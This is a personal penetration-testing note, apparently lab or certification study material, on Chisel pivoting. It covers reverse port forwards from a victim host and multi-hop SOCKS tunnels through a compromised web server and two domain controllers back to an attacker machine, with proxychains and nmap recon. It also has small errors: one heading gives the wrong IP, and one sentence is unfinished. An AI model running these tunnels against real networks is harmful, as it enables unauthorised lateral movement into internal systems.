#tool #pivoting 

https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/

### When you have a port Inaccessible from Outside

```bash
.\chisel.exe client 192.168.45.228:8001 R:30000:127.0.0.1:3306
```

3306 is the victims port  30000 is the local kali listening port

Multiple ports are like below

```bash
.\chisel.exe client 192.168.45.228:8001 R:30000:127.0.0.1:3306 R:8000:127.0.0.1:22
```
### Chisel Multi hops and How to


![[Pasted image 20230730191754.png]]

First we need to start a chisel server running on port 8001 our attacker machine so we can pivot through the `10.10.101.50` machine and gain access to the network. Run the command below to start a server:

**Run command on attacker machine (10.10.101.51)**

```bash
./chisel server -p 8001 --reverse --socks5
```

Assuming we have a foothold on the Web Server we can transfer chisel to the machine and connect back to our chisel server to complete the tunnel.

**Run command on Web Server machine (172.16.1.101 | 10.10.101.50)**
```bash
./chisel client 10.10.101.51:8001 R:socks
```

This will create a reverse proxy and open port 1080 on our machine. Now we can modify our proxychains.conf file to use this proxy. At the bottom of the `/etc/proxychains.conf` add 
	socks5 127.0.0.1 1080`. 

Now that we have this working we can use this to conduct a simple nmap of the internal network from the Web Server.

**Run command on attacker machine (10.10.101.50 | 172.16.1.101)**

```bash
proxychains4 nmap 172.16.1.1/24
```

Now that we have gathered all the info about our current subnet and gained access to all the computers including the domain controller we now want to pivot into the second subnet. We are assuming that the domain controller on the Office Network has a trust with the Admin Network. First we need to start a chisel server on the Web Server in addition to the chisel client we are already using to pivot onto the Office Network similar to how we started a chisel server on our attacker machine. Next we need to transfer the chisel client to the Windows domain controller (`172.16.1.5`) to connect to our chisel server on the web server system so can chain our tunnel.

**Run command on Web Server machine (172.16.1.101)**

```bash
./chisel server -p 8002 --reverse
```

Then on the domain controller (172.16.1.5) in the office network we want create a new connection that will connect to the chisel server running on `172.16.1.101` on port 8002

**Run command on Office Domain Controller machine (172.16.1.5)**
```cmd
chisel.exe client 172.16.1.101:8002 R:2080:socks
```

Finally we now want to add this new connection in our `proxychains.conf` which will look like something below.

	socks5 127.0.0.1 1080
	socks5 127.0.0.1 2080

Our connection should now now be 



Now that we can tunnel through the domain controller we can do some more recon and find the IP of the domain controller of the Admin network. Once we identify the IP of the DC in Admin network (`172.16.2.10`) we can begin to look for a path of compromise.

Lets assume that we now have access to the domain controller in the Admin network. We now want to pivot again from the Office network DC to the Admin network DC so we can recon and eventually gain access to our target computer on the Admin network (`172.16.2.200`). First we want to create a server on the Office DC

**Run command on Office Domain Controller machine (172.16.1.5 )**
```cmd
chisel.exe server -p 8003 --reverse
```

Then on the Admin DC we want to run the following command to connect back to our domain controller.

**Run command on Admin Domain Controller machine (172.16.2.5)**

```cmd
chisel.exe client 172.16.1.5:8003 R:3080:socks
```

Finally we want to add a third entry into our `proxychains.conf`

	socks5 127.0.0.1 1080 
	socks5 127.0.0.1 2080 
	socks5 127.0.0.1 3080